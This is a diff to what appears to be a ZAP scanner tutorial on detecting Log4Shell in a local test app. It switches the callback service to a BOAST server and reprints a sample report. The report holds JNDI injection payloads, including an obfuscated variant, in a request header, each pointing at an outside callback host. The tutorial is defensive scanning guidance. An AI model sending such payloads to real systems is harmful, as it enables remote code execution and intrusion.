@@ -76,10 +76,10 @@ Create these two files on your computer:
  
 **log4shell.conf**
 ```conf
-# Use the public Interactsh service
-oast.activeScanService=Interactsh
-oast.interactsh.serverUrl=https://interactsh.com
-oast.interactsh.pollingFrequency=10
+# Use the public BOAST service
+oast.boast.uri=https://odiss.eu:1337/events
+oast.activeScanService=BOAST
+oast.boast.pollingFrequency=10
  
 # Scan headers in all requests
 scanner.injectable=11
@@ -124,7 +124,7 @@ jobs:
   name: "activeScan"
   type: "activeScan"
 - parameters:
-    time: "1:30"
+    time: "0:30"
   name: "delay"
   type: "delay"
 - type: report
@@ -166,27 +166,27 @@ The generated report should show the vulnerability :smile:.
 							"uri": "http://localhost:8000/",
 							"method": "GET",
 							"param": "X-Api-Version",
-							"attack": "${jndi:dns://7fiivcu3eqx4dozvlnwkofl3te.interactsh.com/abc}",
-							"evidence": "DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.interactsh.com. HTTP/1.1"
+							"attack": "${jndi:dns://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu/abc}",
+							"evidence": "DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1"
 						},
 						{
 							"uri": "http://localhost:8000/",
 							"method": "GET",
 							"param": "X-Api-Version",
-							"attack": "${jndi:${lower:l}${lower:d}a${lower:p}://c5okao7ocmnuwdqvfqcbyah5i4.interactsh.com/abc}",
-							"evidence": "DNS_A http://c5okao7ocmnuwdqvfqcbyah5i4.interactsh.com. HTTP/1.1"
+							"attack": "${jndi:${lower:l}${lower:d}a${lower:p}://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu/abc}",
+							"evidence": "DNS_A http://c5okao7ocmnuwdqvfqcbyah5i4.odiss.eu. HTTP/1.1"
 						},
 						{
 							"uri": "http://localhost:8000/",
 							"method": "GET",
 							"param": "X-Api-Version",
-							"attack": "${jndi:ldap://rgyybz2ieq7efpk2gafiyajyuq.interactsh.com/abc}",
-							"evidence": "DNS_A http://rgyybz2ieq7efpk2gafiyajyuq.interactsh.com. HTTP/1.1"
+							"attack": "${jndi:ldap://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu/abc}",
+							"evidence": "DNS_A http://rgyybz2ieq7efpk2gafiyajyuq.odiss.eu. HTTP/1.1"
 						}
 					],
 					"count": "3",
 					"solution": "<p>Upgrade Log4j2 to version 2.15.0 or newer. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class). Java 8u121 (see https://www.oracle.com/java/technologies/javase/8u121-relnotes.html) protects against remote code execution by defaulting \"com.sun.jndi.rmi.object.trustURLCodebase\" and \"com.sun.jndi.cosnaming.object.trustURLCodebase\" to \"false\".</p>",
-					"otherinfo": "<p></p><p>Request</p><p>DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.interactsh.com. HTTP/1.1</p><p></p><p>;; opcode: QUERY, status: NOERROR, id: 38751</p><p>;; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</p><p></p><p>;; QUESTION SECTION:</p><p>;7fiivcu3eqx4dozvlnwkofl3te.interactsh.com.\tIN\t A</p><p></p><p>;; ADDITIONAL SECTION:</p><p></p><p>;; OPT PSEUDOSECTION:</p><p>; EDNS: version 0; flags: ; udp: 1400</p><p></p><p>Response</p><p>HTTP/1.0 0</p><p></p><p></p><p>--------------------------------</p>",
+					"otherinfo": "<p></p><p>Request</p><p>DNS_A http://7fiivcu3eqx4dozvlnwkofl3te.odiss.eu. HTTP/1.1</p><p></p><p>;; opcode: QUERY, status: NOERROR, id: 38751</p><p>;; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</p><p></p><p>;; QUESTION SECTION:</p><p>;7fiivcu3eqx4dozvlnwkofl3te.odiss.eu.\tIN\t A</p><p></p><p>;; ADDITIONAL SECTION:</p><p></p><p>;; OPT PSEUDOSECTION:</p><p>; EDNS: version 0; flags: ; udp: 1400</p><p></p><p>Response</p><p>HTTP/1.0 0</p><p></p><p></p><p>--------------------------------</p>",
 					"reference": "<p>https://www.cve.org/CVERecord?id=CVE-2021-44228</p><p>https://www.lunasec.io/docs/blog/log4j-zero-day/</p><p>https://nvd.nist.gov/vuln/detail/CVE-2021-44228</p>",
 					"cweid": "117",
 					"wascid": "20",
@@ -204,4 +204,4 @@ While many apps are vulnerable to Log4Shell with no authentication you should no
 
 If an app only uses Log4j to log data from authenticated users then you will only find the vulnerabilities by performing an authenticated scan.
 
-We always recommend running authenticated scans in a safe environment, and if you are doing that then you should check if your app can reach your chosen OAST server (e.g. `ping interactsh.com`). 
+We always recommend running authenticated scans in a safe environment, and if you are doing that then you should check if your app can reach your chosen OAST server (e.g. `ping odiss.eu`). 
